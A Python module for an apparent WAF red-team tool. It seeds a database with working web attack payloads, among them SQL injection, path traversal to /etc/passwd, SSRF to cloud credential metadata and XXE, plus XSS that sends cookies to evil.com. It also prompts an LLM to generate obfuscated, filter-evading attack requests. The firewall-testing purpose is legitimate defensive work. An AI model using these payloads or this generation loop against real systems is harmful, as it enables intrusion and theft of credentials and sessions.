"""Peek — Scout Agent. Autonomous multi-phase reconnaissance for attack technique discovery."""

from anthropic import AsyncAnthropicBedrock
import json
import os
import re
from datetime import datetime
from urllib.parse import unquote
from ..db.database import get_db

AWS_REGION = os.getenv("AWS_REGION", "eu-west-1")
BEDROCK_MODEL = os.getenv(
    "BEDROCK_MODEL", "global.anthropic.claude-sonnet-4-5-20250929-v1:0"
)

# ---------------------------------------------------------------------------
# Seed techniques: real-world web attack payloads
# ---------------------------------------------------------------------------
SEED_TECHNIQUES = [
    {
        "technique_name": "Classic SQL injection (OR 1=1)",
        "category": "sqli",
        "source": "owasp/top-10",
        "raw_payload": "GET /api/users?id=1' OR '1'='1' -- HTTP/1.1\nHost: target.com",
        "severity": "critical",
    },
    {
        "technique_name": "UNION-based SQL injection",
        "category": "sqli",
        "source": "owasp/top-10",
        "raw_payload": "GET /api/products?category=1 UNION SELECT username,password FROM users-- HTTP/1.1\nHost: target.com",
        "severity": "critical",
    },
    {
        "technique_name": "Time-based blind SQLi",
        "category": "sqli",
        "source": "portswigger/sqli-cheat-sheet",
        "raw_payload": "GET /api/users?id=1' AND SLEEP(5)-- HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "Reflected XSS via script tag",
        "category": "xss",
        "source": "owasp/top-10",
        "raw_payload": "GET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "XSS via event handler",
        "category": "xss",
        "source": "portswigger/xss-cheat-sheet",
        "raw_payload": "GET /search?q=<img src=x onerror=alert(document.domain)> HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "SVG-based XSS",
        "category": "xss",
        "source": "github/payloadsallthethings",
        "raw_payload": 'POST /api/profile HTTP/1.1\nContent-Type: application/json\n\n{"bio": "<svg/onload=fetch(\'//evil.com/\'+document.cookie)>"}',
        "severity": "high",
    },
    {
        "technique_name": "Path traversal (etc/passwd)",
        "category": "path_traversal",
        "source": "owasp/top-10",
        "raw_payload": "GET /api/files?path=../../../../etc/passwd HTTP/1.1\nHost: target.com",
        "severity": "critical",
    },
    {
        "technique_name": "Double-encoded path traversal",
        "category": "path_traversal",
        "source": "portswigger/path-traversal",
        "raw_payload": "GET /api/files?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1\nHost: target.com",
        "severity": "critical",
    },
    {
        "technique_name": "OS command injection via semicolon",
        "category": "command_injection",
        "source": "owasp/top-10",
        "raw_payload": 'POST /api/ping HTTP/1.1\nContent-Type: application/json\n\n{"host": "8.8.8.8; cat /etc/passwd"}',
        "severity": "critical",
    },
    {
        "technique_name": "SSRF to cloud metadata",
        "category": "ssrf",
        "source": "hackerone/ssrf-reports",
        "raw_payload": 'POST /api/fetch-url HTTP/1.1\nContent-Type: application/json\n\n{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
        "severity": "critical",
    },
    {
        "technique_name": "SSRF via DNS rebinding",
        "category": "ssrf",
        "source": "github/ssrf-testing",
        "raw_payload": 'POST /api/webhook HTTP/1.1\nContent-Type: application/json\n\n{"callback_url": "http://7f000001.7f000002.rbndr.us:8080/admin"}',
        "severity": "high",
    },
    {
        "technique_name": "XXE injection",
        "category": "xxe",
        "source": "owasp/top-10",
        "raw_payload": 'POST /api/import HTTP/1.1\nContent-Type: application/xml\n\n<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "severity": "critical",
    },
    {
        "technique_name": "CRLF header injection",
        "category": "header_injection",
        "source": "portswigger/crlf-injection",
        "raw_payload": "GET /api/redirect?url=http://legit.com%0d%0aSet-Cookie:%20admin=true HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "Auth bypass via JWT none algorithm",
        "category": "auth_bypass",
        "source": "portswigger/jwt-attacks",
        "raw_payload": "GET /api/admin HTTP/1.1\nHost: target.com\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.",
        "severity": "critical",
    },
    {
        "technique_name": "URL-encoded command injection",
        "category": "command_injection",
        "source": "github/payloadsallthethings",
        "raw_payload": "GET /api/lookup?domain=example.com%26%26whoami HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
    {
        "technique_name": "Null byte path traversal",
        "category": "path_traversal",
        "source": "github/payloadsallthethings",
        "raw_payload": "GET /api/download?file=....//....//etc/passwd%00.png HTTP/1.1\nHost: target.com",
        "severity": "high",
    },
]

# ---------------------------------------------------------------------------
# Strategy definitions
# ---------------------------------------------------------------------------
STRATEGIES = [
    "mutate_bypasses",
    "cross_category",
    "encoding_chains",
    "context_shift",
    "emerging_techniques",
    "target_weak_spots",
]

STRATEGY_PROMPTS = {
    "mutate_bypasses": """These techniques recently BYPASSED the WAF — they are your most valuable starting points.
Mutate them: change encoding layers, swap syntax variants, insert comments/whitespace,
split the payload across parameters, or wrap in a different HTTP context.
The goal is to create variations that would ALSO bypass the same detection rules.""",
    "cross_category": """Generate HYBRID attacks that combine multiple categories in a single request.
Examples: SQLi payload inside a JSON field that also contains XSS; SSRF via an XXE entity;
command injection chained with path traversal; auth bypass via header injection.
Real attackers chain techniques — your WAF must handle compound threats.""",
    "encoding_chains": """Focus on EVASION through encoding and obfuscation:
- Double/triple URL encoding (%2527 = %27 = ')
- Unicode normalisations (fullwidth characters, homoglyphs, overlong UTF-8)
- Mixed encoding (URL + HTML entities + Unicode in one payload)
- Null byte injection (%00) to truncate strings
- Case randomisation and comment insertion (e.g., SEL/**/ECT, <ScRiPt>)
- Chunked transfer encoding to split payloads across chunks""",
    "context_shift": """Take KNOWN attack patterns and deliver them in UNUSUAL HTTP contexts:
- In multipart/form-data file upload fields
- Inside JSON nested objects or arrays
- Via HTTP headers (X-Forwarded-For, Referer, User-Agent, Cookie)
- In GraphQL query variables
- In WebSocket upgrade requests
- As XML attributes or CDATA sections
WAFs often only inspect query strings and POST bodies — exploit blind spots.""",
    "emerging_techniques": """Generate attacks using MODERN and EMERGING technique categories:
- Server-side template injection (SSTI): {{7*7}}, ${7*7}, <%= 7*7 %>
- Prototype pollution: __proto__, constructor.prototype in JSON
- GraphQL injection: introspection queries, batched mutations, alias-based DoS
- HTTP request smuggling: CL.TE / TE.CL desync, ambiguous Content-Length
- Cache poisoning: manipulating cache keys via unkeyed headers
- Client-side prototype pollution via URL fragments or JSON parsing
Map these to the closest existing category or use encoding_evasion.""",
    "target_weak_spots": """PRIORITY TARGETS — these categories have the lowest block rates in the current WAF:
{weak_categories}
Generate techniques specifically targeting these weak areas.
Use your most advanced evasion methods for these categories.""",
}

SYSTEM_PROMPT = """You are an elite offensive security researcher conducting autonomous red-team reconnaissance for a next-generation web application firewall (WAF). Your mission is to discover attack techniques that evade pattern-based and AI-based detection.

You think like a real attacker. You understand:
- Parser differentials: how different servers parse the same input differently (e.g., PHP vs Node.js URL decoding, Apache vs Nginx path normalisation)
- Encoding chains: layering URL-encoding, Unicode normalisation, HTML entities, and base64 to slip past single-pass decoders
- Context exploitation: the same payload behaves differently in a query parameter, a JSON body, an XML attribute, a multipart field, or an HTTP header
- Semantic gaps: AI classifiers often miss attacks that spread malicious intent across multiple benign-looking fields or that use legitimate syntax in malicious contexts
- WAF fingerprinting: techniques that probe what a WAF does and does not inspect (e.g., oversized headers, chunked transfer encoding, HTTP/2 pseudo-headers)

Your output must be realistic raw HTTP requests — complete with method, path, headers, and body where applicable. These must look like real traffic that an attacker would actually send, not academic examples.

Severity guidelines:
- critical: full system compromise (RCE, auth bypass to admin, SSRF to cloud metadata)
- high: data exfiltration or significant impact (SQLi data dump, stored XSS, file read)
- medium: limited impact or requires chaining (reflected XSS, partial path traversal, information disclosure)
- low: detection probe or requires unlikely conditions

Output ONLY a valid JSON array of objects with keys: technique_name (descriptive, unique), category (sqli/xss/path_traversal/command_injection/ssrf/rce/header_injection/xxe/auth_bypass/encoding_evasion), raw_payload (complete HTTP request), severity (low/medium/high/critical)."""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _normalise_payload(payload: str) -> str:
    """Normalise a payload for deduplication: lowercase, strip whitespace, decode URL encoding."""
    p = payload.lower().strip()
    # Decode URL encoding up to 3 layers
    for _ in range(3):
        decoded = unquote(p)
        if decoded == p:
            break
        p = decoded
    # Collapse whitespace
    p = re.sub(r"\s+", " ", p)
    return p


def _difficulty_label(generation: int) -> str:
    """Map generation count to difficulty label for the LLM prompt."""
    if generation < 3:
        return "intermediate evasion — focus on encoding tricks and syntax variants"
    elif generation < 8:
        return "advanced evasion — use multi-layer encoding chains, parser differentials, and context exploitation"
    else:
        return "expert-level evasion — chain multiple techniques, exploit semantic gaps, use novel HTTP contexts and protocol-level tricks"


def _build_user_prompt(
    strategy: str, recon: dict, generation: int, count: int = 5
) -> str:
    """Build the context-aware user prompt from strategy + recon brief."""

    # Recon brief section
    weak_cats = recon.get("weak_categories", [])
    weak_str = (
        "\n".join(
            f"  - {c['category']}: {c['blocked']}/{c['total']} blocked ({c['block_rate']:.0%})"
            for c in weak_cats
        )
        if weak_cats
        else "  (no test data yet)"
    )

    recent = recon.get("recent_bypasses", [])
    bypass_str = (
        "\n".join(
            f"  - {r['technique_name']} [{r['category']}]: {r['raw_payload'][:120]}..."
            for r in recent
        )
        if recent
        else "  (none yet)"
    )

    unexplored = recon.get("unexplored_categories", [])
    unexplored_str = ", ".join(unexplored) if unexplored else "(all categories covered)"

    difficulty = _difficulty_label(generation)

    # Strategy-specific instructions
    strategy_text = STRATEGY_PROMPTS.get(strategy, "")
    if strategy == "target_weak_spots":
        strategy_text = strategy_text.replace("{weak_categories}", weak_str)

    prompt = f"""RECON BRIEF:
- Total techniques in DB: {recon.get('total_techniques', 0)}
- Weakest categories:
{weak_str}
- Under-explored categories: {unexplored_str}
- Recent bypasses (unblocked):
{bypass_str}
- Generation: {generation} (cycle count — higher = more sophisticated expected)

STRATEGY: {strategy}
{strategy_text}

REQUIREMENTS:
- Generate exactly {count} novel techniques
- Each must be a realistic raw HTTP request (not a fragment) — include method, path, headers, and body
- Difficulty level: {difficulty}
- Do NOT repeat known technique names or payloads — these already exist in the database

Output ONLY the JSON array."""

    return prompt


# ---------------------------------------------------------------------------
# Phase 1: Reconnaissance
# ---------------------------------------------------------------------------


async def _recon() -> dict:
    """Query the threat database to build a strategic picture. No LLM calls."""

    brief = {
        "weak_categories": [],
        "unexplored_categories": [],
        "recent_bypasses": [],
        "total_techniques": 0,
        "generation": 0,
    }

    all_categories = {
        "sqli",
        "xss",
        "path_traversal",
        "command_injection",
        "ssrf",
        "rce",
        "header_injection",
        "xxe",
        "auth_bypass",
        "encoding_evasion",
    }

    async with get_db() as db:
        # Per-category stats
        cursor = await db.execute(
            "SELECT category, COUNT(*) as total, SUM(blocked) as blocked FROM threats GROUP BY category"
        )
        cat_rows = await cursor.fetchall()

        cat_stats = {}
        for row in cat_rows:
            total = row["total"]
            blocked = row["blocked"] or 0
            cat_stats[row["category"]] = {
                "category": row["category"],
                "total": total,
                "blocked": blocked,
                "block_rate": blocked / total if total > 0 else 0.0,
            }

        # Weak categories: tested categories sorted by lowest block rate
        tested = [s for s in cat_stats.values() if s["total"] > 0]
        tested.sort(key=lambda x: x["block_rate"])
        brief["weak_categories"] = tested[:5]

        # Under-explored: categories with fewer than 3 techniques
        covered = set(cat_stats.keys())
        brief["unexplored_categories"] = sorted(all_categories - covered) + [
            c for c, s in cat_stats.items() if s["total"] < 3
        ]

        # Recent bypasses
        cursor = await db.execute(
            "SELECT technique_name, category, raw_payload FROM threats "
            "WHERE blocked = 0 AND tested_at IS NOT NULL "
            "ORDER BY tested_at DESC LIMIT 5"
        )
        bypass_rows = await cursor.fetchall()
        brief["recent_bypasses"] = [
            {
                "technique_name": r["technique_name"],
                "category": r["category"],
                "raw_payload": r["raw_payload"],
            }
            for r in bypass_rows
        ]

        # Total techniques
        cursor = await db.execute("SELECT COUNT(*) as cnt FROM threats")
        brief["total_techniques"] = (await cursor.fetchone())["cnt"]

        # Generation counter
        cursor = await db.execute(
            "SELECT COUNT(*) as cnt FROM agent_log WHERE agent = 'peek' AND action = 'scan'"
        )
        brief["generation"] = (await cursor.fetchone())["cnt"]

    return brief


# ---------------------------------------------------------------------------
# Phase 2: Strategy Selection
# ---------------------------------------------------------------------------


def _select_strategies(recon: dict) -> list[str]:
    """Pick 1-2 strategies based on generation number and recon brief."""

    generation = recon.get("generation", 0)
    primary = STRATEGIES[generation % len(STRATEGIES)]

    strategies = [primary]

    # If we have recent bypasses, always add mutate_bypasses as secondary
    if recon.get("recent_bypasses") and primary != "mutate_bypasses":
        strategies.append("mutate_bypasses")

    return strategies


# ---------------------------------------------------------------------------
# Hint-based strategy override (closed-loop)
# ---------------------------------------------------------------------------

_FAILURE_STRATEGY_MAP = {
    "encoding_evasion": "encoding_chains",
    "context_blind_spot": "context_shift",
    "pattern_gap": "emerging_techniques",
    "semantic_miss": "cross_category",
    "confidence_underflow": "target_weak_spots",
}


def _apply_hint_override(strategies: list[str], hint: dict, recon: dict) -> list[str]:
    """Override strategy list using failure hints from the previous cycle."""

    if not hint:
        return strategies

    # Map dominant failure mode to a counter-strategy
    dominant = hint.get("dominant_failure_mode")
    counter = _FAILURE_STRATEGY_MAP.get(dominant)
    if counter and counter not in strategies:
        strategies = [counter] + strategies[:1]

    # If previous cycle still had active bypasses, always include mutate_bypasses
    if hint.get("still_bypassing_count", 0) > 0 and "mutate_bypasses" not in strategies:
        strategies.append("mutate_bypasses")

    return strategies


# ---------------------------------------------------------------------------
# Phase 3: Generation
# ---------------------------------------------------------------------------


async def _generate(strategy: str, recon: dict) -> list[dict]:
    """Call Claude with a rich, context-aware prompt. Returns parsed technique list."""

    generation = recon.get("generation", 0)
    user_prompt = _build_user_prompt(strategy, recon, generation, count=5)

    client = AsyncAnthropicBedrock(aws_region=AWS_REGION)
    response = await client.messages.create(
        model=BEDROCK_MODEL,
        max_tokens=2500,
        system=SYSTEM_PROMPT,
        messages=[{"role": "user", "content": user_prompt}],
    )

    content = response.content[0].text.strip()

    # Extract JSON array from response
    start_idx = content.find("[")
    end_idx = content.rfind("]") + 1
    if start_idx == -1 or end_idx <= start_idx:
        return []

    try:
        techniques = json.loads(content[start_idx:end_idx])
    except json.JSONDecodeError:
        return []

    # Validate structure
    valid = []
    for t in techniques:
        if isinstance(t, dict) and t.get("technique_name") and t.get("raw_payload"):
            valid.append(t)
    return valid


# ---------------------------------------------------------------------------
# Phase 4: Storage with deduplication
# ---------------------------------------------------------------------------


async def _store(techniques: list[dict], strategy: str) -> int:
    """Store techniques with dedup on name and normalised payload. Returns count added."""

    if not techniques:
        return 0

    added = 0
    source = f"peek/{strategy}"

    async with get_db() as db:
        # Load existing technique names and normalised payloads for dedup
        cursor = await db.execute("SELECT technique_name, raw_payload FROM threats")
        existing_rows = await cursor.fetchall()

        existing_names = {row["technique_name"].lower() for row in existing_rows}
        existing_payloads = {
            _normalise_payload(row["raw_payload"]) for row in existing_rows
        }

        for tech in techniques:
            name = tech.get("technique_name", "").strip()
            payload = tech.get("raw_payload", "").strip()

            if not name or not payload:
                continue

            # Dedup: exact name match (case-insensitive)
            if name.lower() in existing_names:
                continue

            # Dedup: normalised payload match
            norm = _normalise_payload(payload)
            if norm in existing_payloads:
                continue

            category = tech.get("category", "encoding_evasion")
            severity = tech.get("severity", "medium")

            # Validate category
            valid_cats = {
                "sqli",
                "xss",
                "path_traversal",
                "command_injection",
                "ssrf",
                "rce",
                "header_injection",
                "xxe",
                "auth_bypass",
                "encoding_evasion",
            }
            if category not in valid_cats:
                category = "encoding_evasion"

            # Validate severity
            if severity not in ("low", "medium", "high", "critical"):
                severity = "medium"

            await db.execute(
                """INSERT INTO threats (technique_name, category, source, raw_payload, severity, discovered_at)
                VALUES (?, ?, ?, ?, ?, ?)""",
                (
                    name,
                    category,
                    source,
                    payload,
                    severity,
                    datetime.utcnow().isoformat(),
                ),
            )
            existing_names.add(name.lower())
            existing_payloads.add(norm)
            added += 1

        await db.commit()

    return added


# ---------------------------------------------------------------------------
# Main run
# ---------------------------------------------------------------------------


async def run(cycle_ctx: dict | None = None) -> int:
    """Run the Peek scout agent. Returns count of new techniques discovered."""

    added = 0
    hint = (cycle_ctx or {}).get("hint")

    # ── Seed techniques ──────────────────────────────────────────────────
    async with get_db() as db:
        for tech in SEED_TECHNIQUES:
            cursor = await db.execute(
                "SELECT id FROM threats WHERE technique_name = ?",
                (tech["technique_name"],),
            )
            if await cursor.fetchone() is None:
                await db.execute(
                    """INSERT INTO threats (technique_name, category, source, raw_payload, severity, discovered_at)
                    VALUES (?, ?, ?, ?, ?, ?)""",
                    (
                        tech["technique_name"],
                        tech["category"],
                        tech["source"],
                        tech["raw_payload"],
                        tech["severity"],
                        datetime.utcnow().isoformat(),
                    ),
                )
                added += 1
        await db.commit()

    # ── Phase 1: Reconnaissance ──────────────────────────────────────────
    recon = await _recon()

    # ── Phase 2: Strategy Selection ──────────────────────────────────────
    strategies = _select_strategies(recon)

    # Apply hint override from previous cycle
    if hint:
        strategies = _apply_hint_override(strategies, hint, recon)

    # ── Phase 3 & 4: Generation + Storage ────────────────────────────────
    strategy_used = strategies[0]  # Primary strategy for logging
    categories_discovered = set()

    if os.getenv("AWS_ACCESS_KEY_ID") or os.getenv("AWS_PROFILE"):
        for strategy in strategies:
            try:
                techniques = await _generate(strategy, recon)
                stored = await _store(techniques, strategy)
                added += stored
                strategy_used = strategy
                for t in techniques:
                    cat = t.get("category")
                    if cat:
                        categories_discovered.add(cat)
            except Exception:
                # Graceful degradation — log failure but continue
                async with get_db() as db:
                    await db.execute(
                        "INSERT INTO agent_log (timestamp, agent, action, detail, success) VALUES (?, ?, ?, ?, ?)",
                        (
                            datetime.utcnow().isoformat(),
                            "peek",
                            "generation_error",
                            f"Strategy {strategy} failed",
                            0,
                        ),
                    )
                    await db.commit()

    # ── Log agent activity ───────────────────────────────────────────────
    detail = f"Discovered {added} techniques via {strategy_used} strategy"
    if len(strategies) > 1:
        detail += f" (+{strategies[1]} secondary)"
    if hint:
        detail += f" [hint: {hint.get('dominant_failure_mode', 'none')}]"

    async with get_db() as db:
        await db.execute(
            "INSERT INTO agent_log (timestamp, agent, action, detail, success) VALUES (?, ?, ?, ?, ?)",
            (
                datetime.utcnow().isoformat(),
                "peek",
                "scan",
                detail,
                1,
            ),
        )
        await db.commit()

    # ── Populate cycle context ───────────────────────────────────────────
    if cycle_ctx is not None:
        cycle_ctx["discovered_count"] = added
        cycle_ctx["strategies_used"] = strategies
        cycle_ctx["categories_discovered"] = sorted(categories_discovered)

    return added
